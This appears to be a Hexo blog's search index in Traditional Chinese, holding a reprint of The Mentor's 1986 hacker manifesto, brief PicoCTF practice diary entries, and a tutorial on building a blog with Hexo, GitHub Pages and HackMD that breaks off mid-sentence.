<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hacker&#39;s Manifesto《駭客宣言》</title>
      <link href="/Hacking/Hacker-s-Manifesto-%E3%80%8A%E9%A7%AD%E5%AE%A2%E5%AE%A3%E8%A8%80%E3%80%8B/"/>
      <url>/Hacking/Hacker-s-Manifesto-%E3%80%8A%E9%A7%AD%E5%AE%A2%E5%AE%A3%E8%A8%80%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文章是在 1986 年 1 月 8 日，由 The Mentor (Loyd Blankenship) 在被逮捕後，發布在地下駭客電子雜誌 Phrack 上。為<strong>盡力保持當初作者寫作的時代背景且不破壞作者想傳達的信念</strong>，故原文會以當初發布的形式，也就是 ASCII 文字的樣態呈現。不會加以用 Markdown 排版、強調、渲染其原文的一切內容。</p><p>譯文的部分，請容許我不為各位翻譯。</p><p>一來是因為如果我翻譯了這篇文章，將會丟失原文所傳達出的意義（相信各位可以理解不同的語言的確會造成表達上的落差）；其次我也認為翻譯此文有違作者希望讀者們能夠擁有的那種絕對的好奇心。<strong>你應該要閱讀原文</strong>。<strong>駭客文化本身就和英文離不開關係</strong>，並且在這篇於電子報上所發布的文章更是如此。作者的每個換行與斷句，都有他的用意。<strong>所以你應該要閱讀原文</strong>。</p><p>最後，也要在此聲明本篇文章是<strong>轉載文章</strong>，僅為了個人喜好而收錄、分享。文章最底部有作者版權資訊。該文章的所有權利歸原作者所有。</p><h1 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">                               ==Phrack Inc.==</span><br><span class="line"></span><br><span class="line">                    Volume One, Issue 7, Phile 3 of 10</span><br><span class="line"></span><br><span class="line">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">The following was written shortly after my arrest...</span><br><span class="line"></span><br><span class="line">                       \/\The Conscience of a Hacker/\/</span><br><span class="line"></span><br><span class="line">                                      by</span><br><span class="line"></span><br><span class="line">                               +++The Mentor+++</span><br><span class="line"></span><br><span class="line">                          Written on January 8, 1986</span><br><span class="line">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">        Another one got caught today, it&#x27;s all over the papers.  &quot;Teenager</span><br><span class="line">Arrested in Computer Crime Scandal&quot;, &quot;Hacker Arrested after Bank Tampering&quot;...</span><br><span class="line">        Damn kids.  They&#x27;re all alike.</span><br><span class="line"></span><br><span class="line">        But did you, in your three-piece psychology and 1950&#x27;s technobrain,</span><br><span class="line">ever take a look behind the eyes of the hacker?  Did you ever wonder what</span><br><span class="line">made him tick, what forces shaped him, what may have molded him?</span><br><span class="line">        I am a hacker, enter my world...</span><br><span class="line">        Mine is a world that begins with school... I&#x27;m smarter than most of</span><br><span class="line">the other kids, this crap they teach us bores me...</span><br><span class="line">        Damn underachiever.  They&#x27;re all alike.</span><br><span class="line"></span><br><span class="line">        I&#x27;m in junior high or high school.  I&#x27;ve listened to teachers explain</span><br><span class="line">for the fifteenth time how to reduce a fraction.  I understand it.  &quot;No, Ms.</span><br><span class="line">Smith, I didn&#x27;t show my work.  I did it in my head...&quot;</span><br><span class="line">        Damn kid.  Probably copied it.  They&#x27;re all alike.</span><br><span class="line"></span><br><span class="line">        I made a discovery today.  I found a computer.  Wait a second, this is</span><br><span class="line">cool.  It does what I want it to.  If it makes a mistake, it&#x27;s because I</span><br><span class="line">screwed it up.  Not because it doesn&#x27;t like me...</span><br><span class="line">                Or feels threatened by me...</span><br><span class="line">                Or thinks I&#x27;m a smart ass...</span><br><span class="line">                Or doesn&#x27;t like teaching and shouldn&#x27;t be here...</span><br><span class="line">        Damn kid.  All he does is play games.  They&#x27;re all alike.</span><br><span class="line"></span><br><span class="line">        And then it happened... a door opened to a world... rushing through</span><br><span class="line">the phone line like heroin through an addict&#x27;s veins, an electronic pulse is</span><br><span class="line">sent out, a refuge from the day-to-day incompetencies is sought... a board is</span><br><span class="line">found.</span><br><span class="line">        &quot;This is it... this is where I belong...&quot;</span><br><span class="line">        I know everyone here... even if I&#x27;ve never met them, never talked to</span><br><span class="line">them, may never hear from them again... I know you all...</span><br><span class="line">        Damn kid.  Tying up the phone line again.  They&#x27;re all alike...</span><br><span class="line"></span><br><span class="line">        You bet your ass we&#x27;re all alike... we&#x27;ve been spoon-fed baby food at</span><br><span class="line">school when we hungered for steak... the bits of meat that you did let slip</span><br><span class="line">through were pre-chewed and tasteless.  We&#x27;ve been dominated by sadists, or</span><br><span class="line">ignored by the apathetic.  The few that had something to teach found us will-</span><br><span class="line">ing pupils, but those few are like drops of water in the desert.</span><br><span class="line"></span><br><span class="line">        This is our world now... the world of the electron and the switch, the</span><br><span class="line">beauty of the baud.  We make use of a service already existing without paying</span><br><span class="line">for what could be dirt-cheap if it wasn&#x27;t run by profiteering gluttons, and</span><br><span class="line">you call us criminals.  We explore... and you call us criminals.  We seek</span><br><span class="line">after knowledge... and you call us criminals.  We exist without skin color,</span><br><span class="line">without nationality, without religious bias... and you call us criminals.</span><br><span class="line">You build atomic bombs, you wage wars, you murder, cheat, and lie to us</span><br><span class="line">and try to make us believe it&#x27;s for our own good, yet we&#x27;re the criminals.</span><br><span class="line"></span><br><span class="line">        Yes, I am a criminal.  My crime is that of curiosity.  My crime is</span><br><span class="line">that of judging people by what they say and think, not what they look like.</span><br><span class="line">My crime is that of outsmarting you, something that you will never forgive me</span><br><span class="line">for.</span><br><span class="line"></span><br><span class="line">        I am a hacker, and this is my manifesto.  You may stop this individual,</span><br><span class="line">but you can&#x27;t stop us all... after all, we&#x27;re all alike.</span><br><span class="line"></span><br><span class="line">                               +++The Mentor+++</span><br><span class="line">_______________________________________________________________________________</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hacking </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 資安 </tag>
            
            <tag> 駭客 </tag>
            
            <tag> Hacker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 09] Grinding PicoCTF 7</title>
      <link href="/2024%20CTF%20Training/Day-09-Grinding-PicoCTF-7/"/>
      <url>/2024%20CTF%20Training/Day-09-Grinding-PicoCTF-7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>明天（2024.07.08）早上十點SCIST的季後賽就開始了，希望這次能打得比上次好！雖然這學期SCIST的課我有兩次沒去（工控安全），因為那時候正值期末周，我還是想說先顧自己轉系的分數&gt;&lt;。話雖如此，還是希望明天能好好發揮，越打越進步。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240707161049632.png" alt="SCIST季後賽通知信"></p><h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><p>今天又刷了兩題RSA，雖然好像這兩題都不是正規的RSA流程，但沒關係還是有稍微練習到XD。</p><ol><li>b00tl3gRSA2</li><li>b00tl3gRSA3</li></ol><h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul><li><p>起床時間：<code>10：10</code></p></li><li><p>知識量：⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF 修煉計畫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PicoCTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> 30天計畫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 08] Grinding PicoCTF 6</title>
      <link href="/2024%20CTF%20Training/Day-08-Grinding-PicoCTF-6/"/>
      <url>/2024%20CTF%20Training/Day-08-Grinding-PicoCTF-6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天到第八天了，也算是正式踏入了將近整個計畫的四分之一。目前到現在覺得收穫還是挺多的，不管是新學到的技術或是之前很多沒有很扎實的基礎觀念，都有在這個計畫中被慢慢補足。</p><p>希望自己接下來的四分之三可以繼續努力！一些 Writeup 中如果有任何有錯誤的地方也都歡迎留言跟我說！</p><h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><ol><li>Super Serial</li><li>rotation</li><li>miniRSA</li></ol><h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul><li>起床時間：<code>9：00</code></li><li>知識量：⭐⭐⭐</li><li>疲勞程度：⭐⭐</li><li>精神狀態：⭐⭐⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF 修煉計畫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PicoCTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> 30天計畫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 07] Grinding PicoCTF 5</title>
      <link href="/2024%20CTF%20Training/Day-07-Grinding-PicoCTF-5/"/>
      <url>/2024%20CTF%20Training/Day-07-Grinding-PicoCTF-5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天斷更了一天，因為打算把中文站點和英文站點分開，所以對網站做了一些重構。</p><p>總之現在中文的站點在 <a href="https://cx330.tw/">https://cx330.tw</a>；而英文的站點在 <a href="https://en.cx330.tw/">https://en.cx330.tw</a>。是採用子域名的方式搭建的。大家可以兩邊都去玩玩看噢！雖然還有些文章還沒翻譯，但到時候英文站點應該就會是全英文了。</p><p>就醬。</p><h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><p>由於上面所說的，這兩天花滿多時間在建站 + 重構，所以寫的題目比較少，如下。</p><ol><li>interencdec</li><li>Super Serial 寫一半，明天繼續</li></ol><h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul><li><p>起床時間：<code>9：00</code></p></li><li><p>知識量：⭐⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐⭐⭐⭐</p></li><li><p>精神狀態：⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF 修煉計畫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PicoCTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> 30天計畫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 06] Grinding PicoCTF 4</title>
      <link href="/2024%20CTF%20Training/Day-06-Grinding-PicoCTF-4/"/>
      <url>/2024%20CTF%20Training/Day-06-Grinding-PicoCTF-4/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天九點多起來後吃了早餐，結果又跑回去睡覺睡到 13 點多，到底是個甚麼意思哦。為甚麼可以那麼累阿昨天明明也沒有很晚睡。每次晚起床都會有罪惡感，要被自己氣死。</p><h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><p>今天寫了兩題，一題 Pwn，一題 Crypto。昨天的 Local Target 我已經請求外場學長的幫助了（因為它的 writeup 好少，看了也不太懂）。等學長伸出援手後我再回去補完更詳細的 Writeup。</p><ol><li>buffer overflow 0</li><li>Mini RSA</li></ol><h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul><li>起床時間：<code>13：30</code>，不知道為甚麼今天超累。</li><li>知識量：⭐⭐⭐⭐</li><li>疲勞程度：⭐⭐⭐⭐⭐</li><li>精神狀態：⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF 修煉計畫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PicoCTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> 30天計畫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 05] Grinding PicoCTF 3</title>
      <link href="/2024%20CTF%20Training/Day-05-Grinding-PicoCTF-3/"/>
      <url>/2024%20CTF%20Training/Day-05-Grinding-PicoCTF-3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天還跑到台南去領租屋處的鑰匙和小搬家，下午才跑去星巴克開始今日的 CTF 訓練。</p><p>不得不說台南真的太熱了。🥲🥲🥲</p><h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><p>Pwn 真的太難了，Local Target 我已經找到 flag 了只是還沒有很理解他的原理，先標記為做一半明天繼續。</p><ol><li>unminify</li><li>SQLiLite</li><li>GDB Test Drive</li><li>Local Target 做到一半</li></ol><h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul><li>起床時間：<code>7：30</code></li><li>知識量：⭐⭐⭐⭐</li><li>疲勞程度：⭐⭐⭐⭐⭐</li><li>精神狀態：⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF 修煉計畫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PicoCTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> 30天計畫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不懂就問！如何利用 Hexo + GitHub + HackMD 搭建自己的個人部落格</title>
      <link href="/DevCorner/%E4%B8%8D%E6%87%82%E5%B0%B1%E5%95%8F%EF%BC%81%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8-Hexo-GitHub-HackMD-%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%80%8B%E4%BA%BA%E9%83%A8%E8%90%BD%E6%A0%BC/"/>
      <url>/DevCorner/%E4%B8%8D%E6%87%82%E5%B0%B1%E5%95%8F%EF%BC%81%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8-Hexo-GitHub-HackMD-%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%80%8B%E4%BA%BA%E9%83%A8%E8%90%BD%E6%A0%BC/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>從正在打這些字的今天開始算的話，距離網站架設起來的時間也有一個月了。</p><p>這段時間一直沒有好好的紀錄一下架站的過程，正好我身邊有一些朋友也想開始架自己的部落格，所以順便就來做個教學吧！</p><p>如同文章的標題，這次主要使用的就是 Hexo、GitHub、HackMD，那事不宜遲，我們就開始吧！</p><h1 id="Hexo-部署"><a href="#Hexo-部署" class="headerlink" title="Hexo 部署"></a>Hexo 部署</h1><p>在開始前，我們先來介紹一下 Hexo 是甚麼吧！Hexo 是一個很快速也很輕量的靜態網頁框架（大部分用來架設 Blog），它可以讓使用者利用 Markdown 寫作，Hexo 會自己幫你生成靜態文件。</p><p>總之就是個很方便的框架，<strong>一天內一定可以讓你的網站順利上線</strong>！（加上一些環境問題還有其他的依賴問題，最少一個禮拜內也一定可以完成的）</p><h2 id="安裝-Hexo"><a href="#安裝-Hexo" class="headerlink" title="安裝 Hexo"></a>安裝 Hexo</h2><p>在安裝前，有一些依賴環境需要先安裝，請先確保你的電腦上已經安裝了：</p><ul><li><a href="https://git-scm.com/">Git</a></li><li><a href="https://nodejs.org/en">Node.js</a>（官方推薦 Node.js 10.0 及其以上的版本）</li></ul><p>如果還沒安裝過，請先去安裝（網路上找有很多教學了，就先跳過）。確保有以上的軟體後，就可以安裝啦！Hexo 的安裝真的真的超級簡單（Mac 使用者可能會有環境問題，請看 <a href="https://hexo.io/zh-tw/docs/">官方說明文件</a>）。首先，請打開你的終端機（cmd、Powershell 等），並且輸入以下的命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>安裝完成後，輸入<code>hexo -v</code>查看版本號，有正確顯示的話就說明安裝成功啦！</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630164342694.png" alt="hexo -v"></p><h2 id="建立你的-Hexo-資料"><a href="#建立你的-Hexo-資料" class="headerlink" title="建立你的 Hexo 資料"></a>建立你的 Hexo 資料</h2><p>安裝好 Hexo 的 CLI 工具後，就可以開始建立 Hexo 的資料夾了。<strong>注意，這個檔案夾就是你以後寫文章、放文章照片等等的地方了。</strong>首先，先移動到你想要放置這個檔案的路徑底下，並在這個路徑中打開終端，輸入以下的命令。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;資料夾名稱&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630165449041.png" alt="hexo init"></p><p>接下來，要進入這個資料夾中，安裝這個專案所需要的依賴包。請依序的輸入以下的命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> &lt;資料夾名稱&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630165915129.png" alt="image-20240630165915129"></p><p>這樣就完成了初步的建立啦！建立完成後，專案資料夾下的檔案會像是以下這樣：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><p>這些檔案都有其各自的用途，分別是：</p><p><strong>_config.yml</strong></p><ul><li>網站的配置檔案，可以設定如 URL、預設語言、站點名稱等。大部分的設置都會在這裡。</li></ul><p><strong>package.json</strong></p><ul><li>存放專案中所有需要用到的模組。</li></ul><p><strong>scaffolds</strong></p><ul><li><a href="https://hexo.io/zh-tw/docs/writing.html#%E9%B7%B9%E6%9E%B6%EF%BC%88Scaffold%EF%BC%89">鷹架</a> 的資料夾，裡面會放一些鷹架的架構。</li></ul><p><strong>source</strong></p><ul><li>這裡就是存放所有網頁內容的資料夾，包含文章、圖片等。以後寫文章也基本都是在這層目錄工作。</li></ul><p><strong>themes</strong></p><ul><li>主題的資料夾。</li></ul><p>到了這邊，你已經大致架完了 Hexo 的環境，那接下來看看怎麼部署到 GitHub 吧。</p><h2 id="Hexo-指令"><a href="#Hexo-指令" class="headerlink" title="Hexo 指令"></a>Hexo 指令</h2><p>之後寫文章一定會用到的，就是 Hexo 的指令了。我會簡單介紹幾個，想要了解更詳細請見 <a href="https://hexo.io/zh-tw/docs/commands">官方文件</a>。</p><h3 id="創建新文章"><a href="#創建新文章" class="headerlink" title="創建新文章"></a>創建新文章</h3><p>以下的角括號請替換為你自己的文章標題。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;&lt;文章標題&gt;&quot;</span><br></pre></td></tr></table></figure><p>這個指令會生成一份<strong>markdown</strong>文件到<strong>_post</strong>資料夾中。</p><h3 id="本地預覽"><a href="#本地預覽" class="headerlink" title="本地預覽"></a>本地預覽</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>或是也可以簡寫為</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>這個指令會在 localhost 上面啟動伺服器，讓你先預覽網站。</p><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p>也可以簡寫為</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>它會自動把你的<strong>source</strong>資料夾中的內容生成為靜態檔案，並且部署到你所設定的 GitHub Repo。（後面會詳細介紹實作方式）</p><h3 id="刪除靜態檔案"><a href="#刪除靜態檔案" class="headerlink" title="刪除靜態檔案"></a>刪除靜態檔案</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><p>這個指令會幫你把你使用<code>hexo generate</code>或是<code>hexo deploy</code>所產生的靜態檔案刪除。</p><h1 id="連結-GitHub-Repo"><a href="#連結-GitHub-Repo" class="headerlink" title="連結 GitHub Repo"></a>連結 GitHub Repo</h1><h2 id="創建-Repo"><a href="#創建-Repo" class="headerlink" title="創建 Repo"></a>創建 Repo</h2><p>首先，你要先建立一個 GitHub Repo，用來存放網站的靜態資料。同時，這個 GitHub Repo 也會成為到時候部署的地方（當然你也可以用其他的靜態網站託管服務，但這是免費的！）。</p><p>建立 Repo 的時候，請遵循以下幾個要點：</p><ol><li>Repo 名稱設定為<strong>USERNAME.github.io</strong>，<strong>USERNAME</strong>記得改為你自己的使用者名稱。</li><li>Repo 請設定為<strong>公開</strong></li></ol><p>完成後，我們就來把這個 Repo（以下簡稱為 GitHub Repo）連結到你的 Hexo 專案吧！開始前你需要先安裝一個部署的外掛。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>打開你的 Hexo 專案中的<code>_config.yml</code>，並加入以下的設定：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">&lt;你的</span> <span class="string">Repo</span> <span class="string">URL&gt;</span> <span class="comment"># https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><h2 id="建立-GitHub-Pages"><a href="#建立-GitHub-Pages" class="headerlink" title="建立 GitHub Pages"></a>建立 GitHub Pages</h2><p>進到你的 GitHub Repo 中，點選 Settings。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630173247120.png" alt="GitHub Repo Settings"></p><p>在側邊點選 Pages。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630173423864.png" alt="GitHub Pages"></p><p>把<code>Branch</code>切換到<code>Main</code>，並且按下<code>Save</code>。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630173802148.png" alt="Set branch to main"></p><p>完成後，等待個大約一到兩分鐘，上面就會顯示出你的網站部署好的 URL 啦！</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240630173922108.png" alt="Finish!"></p><p>因為我有購買域名，所以可以設定 Custom Domain。如果你也有購買域名，並且想設置它作為你的部落格 URL，請見 <a href="https://clairechang.tw/2023/06/28/web/github-pages-with-custom-domain/">GitHub Pages 自訂域名與 HTTPS 設定（GoDaddy + Cloudflare）</a>。</p><h2 id="修改Hexo配置文件"><a href="#修改Hexo配置文件" class="headerlink" title="修改Hexo配置文件"></a>修改Hexo配置文件</h2><p>創建好Repo後，你需要打開Hexo專案資料夾裡面的的<code>_config.yml</code>文件（<strong>注意，這邊是指Hexo配置文件，並不是主題配置文件</strong>），新增以下內容。（詳見 <a href="https://hexo.io/zh-tw/docs/one-command-deployment">官方文檔</a>）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">你的專案連結</span> <span class="comment">#舉例：https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span></span><br><span class="line">  <span class="attr">branch:</span> [<span class="string">branch</span>]<span class="comment"># 通常為main</span></span><br></pre></td></tr></table></figure><p>修改完後，還需要去安裝一個套件。這個套件可以幫助你自動部署你使用<code>hexo d</code>時產生的靜態文件到你設定的Repo。安裝方式如下：</p><ol><li>打開你的Hexo專案資料夾（有<code>package.json</code>的那個資料夾）。</li><li>在這層目錄中打開終端。</li><li>輸入<code>npm install hexo-deployer-git --save</code>。</li><li>大功告成。</li></ol><p>如果你有使用Vscode的GitHub擴充套件儲存過使用者token，就可以直接用<code>hexo d</code>部署你的文章啦！如果沒有的話也沒關係，只需要在<code>hexo d</code>的時候提供使用者名稱和密碼就行了。</p><p>到這邊，你就已經大致完成啦！接下來只要找個喜歡的 <a href="https://hexo.io/themes/">Hexo 主題</a>、<a href="https://hexo.io/zh-tw/docs/configuration">設定配置文件</a>，就可以開始寫作囉！（這邊可以去看看官方文件，選個自己喜歡的主題，並照著文檔配置就行了）</p><h2 id="部署到網站上"><a href="#部署到網站上" class="headerlink" title="部署到網站上"></a>部署到網站上</h2><p>GitHub Pages 有個很方便的功能，就是當你每次有新的 Commit 的時候，它都會自動幫你更新你的網頁的內容。所以以後更新文章後，只需要使用<code>hexo deploy</code>把更新的內容提交到 GitHub 倉庫，它就會自動幫你更新網頁啦！</p><h1 id="開始寫作啦！"><a href="#開始寫作啦！" class="headerlink" title="開始寫作啦！"></a>開始寫作啦！</h1><p>我自己目前的寫作方式，是使用 <a href="https://hackmd.io/">HackMD</a> 來寫作的，因為它有許多優點。</p><ol><li><strong>免費的圖床</strong><ul><li>不只免費，操作也只要複製圖片並貼上，就能自動生成圖片 URL，讓寫作更輕鬆。</li></ul></li><li><strong>迅速且輕便</strong><ul><li>以網頁為主的 HackMD，讓你只需要一個瀏覽器就可以快速打開筆記，並開始寫作。</li></ul></li><li><strong>對 Markdown 語法的支援</strong><ul><li>支援 MathJax、Mermaid 等 Markdown 擴充語法，讓寫作可以更靈活。</li></ul></li></ol><p>至於我寫作的方式，步驟如下：</p><ul><li>用<code>hexo new &lt;文章標題&gt;</code>先建立一篇文章在 Post 資料夾。（目的是可以生成文章創建的時間，以及文章的 <a href="https://hexo.io/zh-tw/docs/front-matter">Front Matter</a>）</li><li>複製貼上（包含 Front Matter）到 HackMD 編輯。</li><li>編輯完後，再複製回原本的檔案。</li><li>用<code>hexo deploy</code>部署。</li></ul><p>這樣就完成了一次的寫作啦！畢竟寫文章一定會多多少少有圖片，使用 HackMD 就可以不用擔心圖片問題，可以很方便也很迅速地完成寫作歐！</p><h1 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h1><p>我覺得用這套方法<strong>便宜</strong>、<strong>方便</strong>、<strong>快速</strong>，不僅可以提升你寫作的意願，也可以讓你在一開始比較有成就感，增強你寫作的動力！真的是很不錯的方式～</p><p>我自己建立部落格所需要的花費就只有</p><ul><li>$1468 買了兩年的域名</li><li><del>花了很多的時間踩坑</del>（但是不是 Hexo 